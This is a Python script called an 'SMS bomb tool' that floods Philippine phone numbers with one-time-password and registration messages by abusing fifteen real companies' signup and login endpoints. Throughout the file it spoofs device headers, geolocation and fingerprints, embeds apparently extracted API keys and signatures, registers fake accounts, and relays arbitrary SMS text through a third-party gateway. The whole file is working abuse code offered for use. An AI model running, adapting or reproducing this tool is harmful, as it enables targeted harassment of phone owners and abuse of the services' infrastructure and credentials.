#!/usr/bin/env python3
"""
ALEXDEV BOMB TOOL
Author: Alex Jhon Ponce
Telegram: https://t.me/alexdevyuhhh
Facebook: https://www.facebook.com/alexdevyuhhh
Philippine Numbers Only — 15 Services
"""

import random
import string
import time
import requests
import hashlib
import threading
from datetime import datetime, timezone
from queue import Queue


def _rs(length=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


class MWELLWorker:
    def __init__(self, parent):
        self.parent = parent
        self.queue = Queue()
        self.running = False
        self.current_cooldown = 0
        self.worker_thread = None
        self.batch_results = {}

    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker_thread.start()

    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=5)

    def add_task(self, phone_number, batch_num):
        self.queue.put((phone_number, batch_num))

    def _worker_loop(self):
        while self.running:
            try:
                if not self.queue.empty():
                    phone_number, batch_num = self.queue.get()
                    if self.current_cooldown > 0:
                        time.sleep(self.current_cooldown)
                    success, message, new_cooldown = self._send_mwell_request(phone_number)
                    self.batch_results[batch_num] = {
                        'success': success,
                        'message': message,
                        'timestamp': datetime.now().strftime('%H:%M:%S')
                    }
                    self.current_cooldown = new_cooldown if new_cooldown > 0 else 5
                    self.queue.task_done()
                else:
                    time.sleep(0.5)
            except Exception:
                time.sleep(2)

    def _send_mwell_request(self, phone_number):
        try:
            fp = self.parent.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': random.choice(['03.942.035', '03.942.036', '03.942.037']),
                'x-device-type': 'android',
                'x-device-model': random.choice([
                    'oneplus CPH2465', 'samsung SM-G998B',
                    'xiaomi Redmi Note 13', 'realme RMX3700'
                ]),
                'content-type': 'application/json; charset=utf-8',
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': _rs(16)
            }
            data = {
                'country': 'PH',
                'phoneNumber': fp,
                'phoneNumberPrefix': '+63'
            }
            r = requests.post(
                'https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number',
                headers=headers, json=data, timeout=20
            )
            if r.status_code == 200:
                resp = r.json()
                if resp.get('c') == 200:
                    cooldown = 60
                    try:
                        resend_at = resp['d']['resendAt']
                        resend_time = datetime.fromisoformat(resend_at.replace('Z', '+00:00'))
                        cooldown = max(1, (resend_time - datetime.now(timezone.utc)).total_seconds())
                    except Exception:
                        pass
                    return True, 'OTP sent successfully', cooldown
                return False, f"API Error: Code {resp.get('c')}", 30
            return False, f'HTTP {r.status_code}', 30
        except Exception as e:
            return False, f'Connection error: {str(e)[:50]}', 30

    def send_sync(self, phone_number):
        return self._send_mwell_request(phone_number)

    def get_batch_result(self, batch_num):
        return self.batch_results.get(batch_num)

    def has_pending_tasks(self):
        return not self.queue.empty()

    def wait_for_completion(self, timeout=300):
        start = time.time()
        while self.has_pending_tasks() and (time.time() - start) < timeout:
            time.sleep(1)
        time.sleep(2)
        return not self.has_pending_tasks()


class PEXXWorker:
    def __init__(self, parent):
        self.parent = parent
        self.queue = Queue()
        self.running = False
        self.current_cooldown = 0
        self.worker_thread = None
        self.batch_results = {}

    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker_thread.start()

    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=5)

    def add_task(self, phone_number, batch_num):
        self.queue.put((phone_number, batch_num))

    def _worker_loop(self):
        while self.running:
            try:
                if not self.queue.empty():
                    phone_number, batch_num = self.queue.get()
                    if self.current_cooldown > 0:
                        time.sleep(self.current_cooldown)
                    success, message, new_cooldown = self._send_pexx_request(phone_number)
                    self.batch_results[batch_num] = {
                        'success': success,
                        'message': message,
                        'timestamp': datetime.now().strftime('%H:%M:%S')
                    }
                    self.current_cooldown = new_cooldown if new_cooldown > 0 else 5
                    self.queue.task_done()
                else:
                    time.sleep(0.5)
            except Exception:
                time.sleep(2)

    def _send_pexx_request(self, phone_number):
        try:
            fp = self.parent.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'x-msession-id': 'undefined',
                'x-oid': '',
                'tid': _rs(11),
                'appversion': '3.0.14',
                'sentry-trace': _rs(32),
                'baggage': (
                    'sentry-environment=production,'
                    'sentry-public_key=811267d2b611af4416884dd91d0e093c,'
                    f'sentry-trace_id={_rs(32)}'
                )
            }
            data = {
                '0': {
                    'json': {
                        'email': '',
                        'areaCode': '+63',
                        'phone': f'+63{fp}',
                        'otpChannel': 'TG',
                        'otpUsage': 'REGISTRATION'
                    }
                }
            }
            r = requests.post(
                'https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1',
                headers=headers, json=data, timeout=20
            )
            if r.status_code == 200:
                resp = r.json()
                if isinstance(resp, list) and len(resp) > 0:
                    result_data = resp[0].get('result', {}).get('data', {}).get('json', {})
                    if result_data.get('code') == 200:
                        cooldown = result_data.get('data', {}).get('resendTimeInSec', 60)
                        return True, 'OTP sent successfully', cooldown
                    return False, f"API Error: {result_data.get('msg', 'Unknown')}", 30
                return False, 'Invalid response format', 30
            return False, f'HTTP {r.status_code}', 30
        except Exception as e:
            return False, f'Connection error: {str(e)[:50]}', 30

    def send_sync(self, phone_number):
        return self._send_pexx_request(phone_number)

    def get_batch_result(self, batch_num):
        return self.batch_results.get(batch_num)

    def has_pending_tasks(self):
        return not self.queue.empty()

    def wait_for_completion(self, timeout=300):
        start = time.time()
        while self.has_pending_tasks() and (time.time() - start) < timeout:
            time.sleep(1)
        time.sleep(2)
        return not self.has_pending_tasks()


class BomberTool:
    def __init__(self):
        self.osim_url = 'https://prod.services.osim-cloud.com/identity/api/v1.0/account'
        self.mwell_worker = MWELLWorker(self)
        self.pexx_worker = PEXXWorker(self)
        self.all_services = [
            ('BOMB OTP',          self.send_bomb_otp),
            ('EZLOAN',            self.send_ezloan),
            ('XPRESS PH',         self.send_xpress),
            ('ABENSON',           self.send_abenson),
            ('EXCELLENT LENDING', self.send_excellent_lending),
            ('BISTRO',            self.send_bistro),
            ('BAYAD CENTER',      self.send_bayad),
            ('LBC CONNECT',       self.send_lbc),
            ('PICKUP COFFEE',     self.send_pickup_coffee),
            ('HONEY LOAN',        self.send_honey_loan),
            ('KUMU PH',           self.send_kumu_ph),
            ('S5.COM',            self.send_s5_otp),
            ('CASHALO',           self.send_cashalo),
            ('MWELL',             self.send_mwell),
            ('PEXX',              self.send_pexx),
        ]

    def format_phone(self, phone):
        p = str(phone).strip().replace(' ', '').replace('-', '').replace('+', '')
        if p.startswith('0'):
            p = p[1:]
        elif p.startswith('63'):
            p = p[2:]
        return p

    def validate_phone(self, phone):
        import re
        return bool(re.match(r'^9\d{9}$', self.format_phone(phone)))

    def random_string(self, length=8):
        return _rs(length)

    def random_gmail(self):
        n = random.randint(8, 12)
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n)) + '@gmail.com'

    def generate_kumu_signature(self, timestamp, random_str, phone_number):
        secret = 'kumu_secret_2024'
        data = f'{timestamp}{random_str}{phone_number}{secret}'
        return hashlib.sha256(data.encode()).hexdigest()

    def send_bomb_otp(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json; charset=utf-8',
                'accept-language': 'en-SG',
                'region': 'PH',
                'X-Country': 'PH',
            }
            data = {
                'phone': f'63{fp}',
                'phoneCode': '63',
                'password': f'TempPass{random.randint(1000, 9999)}!',
                'userName': fp,
            }
            r = requests.post(f'{self.osim_url}/register', headers=headers, json=data, timeout=8)
            if r.status_code == 200:
                res = r.json()
                if res.get('resultCode', 0) in [201000, 200000, 0]:
                    return True, res.get('message', 'Bomb sent')
                return False, res.get('message', f"Code {res.get('resultCode')}")
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_ezloan(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            ts = int(time.time() * 1000)
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'accept-language': 'en',
                'imei': '7a997625bd704baebae5643a3289eb33',
                'device': 'android',
                'buildtype': 'release',
                'brand': 'oneplus',
                'model': 'CPH2465',
                'manufacturer': 'oneplus',
                'source': 'EZLOAN',
                'channel': 'GooglePlay_Blue',
                'appversion': '2.0.4',
                'appversioncode': '2000402',
                'version': '2.0.4',
                'versioncode': '2000401',
                'sysversion': '16',
                'sysversioncode': '36',
                'customerid': '',
                'businessid': 'EZLOAN',
                'phone': '',
                'appid': 'EZLOAN',
                'authorization': '',
                'blackbox': f'kGPGg{ts}DCl3O8MVBR0',
            }
            data = {
                'businessId': 'EZLOAN',
                'contactNumber': f'0{fp}',
                'appsflyerIdentifier': f'{ts}-{random.randint(10**18, 10**19 - 1)}'
            }
            r = requests.post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                resp = r.json()
                if resp.get('code') == 0:
                    return True, resp.get('msg', 'Sent')
                return False, resp.get('msg', 'Failed')
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_xpress(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            ts = int(time.time() * 1000)
            headers = {
                'User-Agent': 'Dalvik/2.1.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            data = {
                'FirstName': 'user',
                'LastName': 'test',
                'Email': f'user{ts}@gmail.com',
                'Phone': f'+63{fp}',
                'Password': 'Pass1234',
                'ConfirmPassword': 'Pass1234',
                'FingerprintVisitorId': 'TPt0yCuOFim3N3rzvrL1',
                'FingerprintRequestId': '1757149666261.Rr1VvG',
            }
            r = requests.post(
                'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_abenson(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
            }
            data = {
                'contact_no': fp,
                'login_token': 'undefined'
            }
            r = requests.post(
                'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                headers=headers, data=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_excellent_lending(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            coordinates = [
                {'lat': '14.5995', 'long': '120.9842'},
                {'lat': '14.6760', 'long': '121.0437'},
                {'lat': '14.8648', 'long': '121.0418'}
            ]
            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            coord = random.choice(coordinates)
            headers = {
                'User-Agent': random.choice(agents),
                'Content-Type': 'application/json; charset=utf-8',
                'x-latitude': coord['lat'],
                'x-longitude': coord['long'],
            }
            data = {
                'domain': f'0{fp}',
                'cat': 'login',
                'previous': False,
                'financial': 'efe35521e51f924efcad5d61d61072a9'
            }
            r = requests.post(
                'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_bistro(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            uid = _rs(28)
            device_id = _rs(16)
            command_array = [
                'free.text.sms', '421', f'+63{fp}',
                '2207117BPG',
                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                'You have a new message -freed0m'
            ]
            import json as _json
            from urllib.parse import urlencode
            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'UID': uid,
                'humottaee': 'Processing',
                'Email': f'{_rs(8)}@gmail.com',
                '$Oj0O%K7zi2j18E': _json.dumps(command_array),
                'device_id': device_id,
                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
                'Name': 'User'
            }
            r = requests.post(
                'https://sms.m2techtronix.com/v13/sms.php',
                headers=headers, data=urlencode(data), timeout=10
            )
            if r.status_code == 200:
                return True, 'SMS sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_bayad(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            ts = int(time.time() * 1000)
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            }
            data = {
                'businessId': 'BAYAD',
                'contactNumber': f'0{fp}',
                'appsflyerIdentifier': f'{ts}-{random.randint(10**18, 10**19 - 1)}'
            }
            r = requests.post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_lbc(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            data = {
                'verification_type': 'mobile',
                'client_email': f'{_rs(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': fp,
                'app_log_uid': _rs(16),
            }
            r = requests.post(
                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                headers=headers, data=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_pickup_coffee(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            headers = {
                'User-Agent': random.choice(agents),
                'Content-Type': 'application/json',
            }
            data = {
                'mobile_number': f'+63{fp}',
                'login_method': 'mobile_number'
            }
            r = requests.post(
                'https://production.api.pickup-coffee.net/v2/customers/login',
                headers=headers, json=data, timeout=8
            )
            if r.status_code in [200, 201]:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_honey_loan(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }
            data = {
                'phone': f'0{fp}',
                'is_rights_block_accepted': 1
            }
            r = requests.post(
                'https://api.honeyloan.ph/api/client/registration/step-one',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_kumu_ph(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d2109154bb7ae63d1662e9a1958',
                'User-Agent': 'Dart/3.6 (dart:io)',
            }
            data = {
                'mobileNumber': f'+63{fp}',
                'channel': 'SMS',
            }
            r = requests.post(
                'https://api.komo.ph/v1/otp/send',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_s5_otp(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
            }
            data = {
                'deviceId': 'c31a9bc0-652d-11f0-88cf-9d4076456969',
                'deviceType': 'GOOGLE_PLAY',
                'companyId': '4bf735e97269421a80b82359e7dc2288',
                'dialCode': '+63',
                'phoneNumber': fp,
            }
            r = requests.post(
                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_cashalo(self, phone_number):
        try:
            fp = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer',
            }
            data = {
                'phone_country': '+63',
                'phone_no': fp,
            }
            r = requests.post(
                'https://api.wemove.com.ph/auth/users',
                headers=headers, json=data, timeout=8
            )
            if r.status_code == 200:
                return True, 'OTP sent'
            return False, f'HTTP {r.status_code}'
        except Exception as e:
            return False, f'Error: {str(e)[:50]}'

    def send_mwell(self, phone_number):
        success, message, _ = self.mwell_worker.send_sync(phone_number)
        return success, message

    def send_pexx(self, phone_number):
        success, message, _ = self.pexx_worker.send_sync(phone_number)
        return success, message
